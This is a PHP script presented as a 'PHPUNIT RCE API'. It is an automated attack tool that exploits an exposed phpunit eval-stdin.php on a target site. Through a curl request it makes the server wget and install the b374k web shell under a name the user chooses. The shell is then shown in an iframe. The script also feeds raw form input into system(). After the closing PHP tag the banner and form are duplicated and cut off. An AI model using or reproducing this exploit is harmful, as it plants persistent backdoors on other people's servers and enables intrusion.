<?php


$shellname = $_POST['shellname'];
$url = $_POST['url'];
$foundfile = $url."/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php";
$shellfound = $url."/vendor/phpunit/phpunit/src/Util/PHP/".$shellname;
$actual_link = $_SERVER["HTTP_HOST"];



echo '
<!DOCTYPE html>
<html>
<head>
	<title>	PHPUNIT RCE API</title>
</head>
<body style="background-color: 	rgb(55,55,55);">
<center>	
	<pre style="color:white;">

  _____  _    _ _____  _    _ _   _ _____ _______ 
 |  __ \| |  | |  __ \| |  | | \ | |_   _|__   __|
 | |__) | |__| | |__) | |  | |  \| | | |    | |   
 |  ___/|  __  |  ___/| |  | | . ` | | |    | |   
 | |    | |  | | |    | |__| | |\  |_| |_   | |   
 |_|    |_|  |_|_|     \____/|_| \_|_____|  |_|   
        

	</pre>
<form method="POST">
	<p style="color:white;">URL:</p><input type="text" placeholder="http://target.co.id/[patch]/" name="url">
	<br>
	<p style="color:white;">Shell Name(exemple: shell.php ):</p><input type="text" name="shellname">
	<br>
	<button type="Submit" name="AutoShell">Auto shell</button>
	<br>
	<p style="color:red;">Coded by ./EcchiExploit | BhiOfficial</p>
	<br>
	<br>

	
</form>
</center>';


if(isset($_POST['AutoShell']))
{

system("curl --data \"<?system('wget https://raw.githubusercontent.com/JohnTroony/php-webshells/master/b374k-mini-shell-php.php.php -O ".$shellname."');?>\" -X GET ".$url."/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php");

echo '<iframe style="height: 1000px; width: 1550px;" src="'.$url."/vendor/phpunit/phpunit/src/Util/PHP/".$shellname.'"></iframe>'; 

 }

 
?>    | |   
 |  ___/|  __  |  ___/| |  | | . ` | | |    | |   
 | |    | |  | | |    | |__| | |\  |_| |_   | |   
 |_|    |_|  |_|_|     \____/|_| \_|_____|  |_|   
        

	</pre>
<form method="POST">
	<p style="color:white;">URL:</p><input type="text" placeholder="http://target.co.id/[patch]/" name="url">
	<br>
	<p style="color:white;">Shell Name(exemple: shell.php ):</p><input type="text" name="shellname">
	<br>
	<button typ
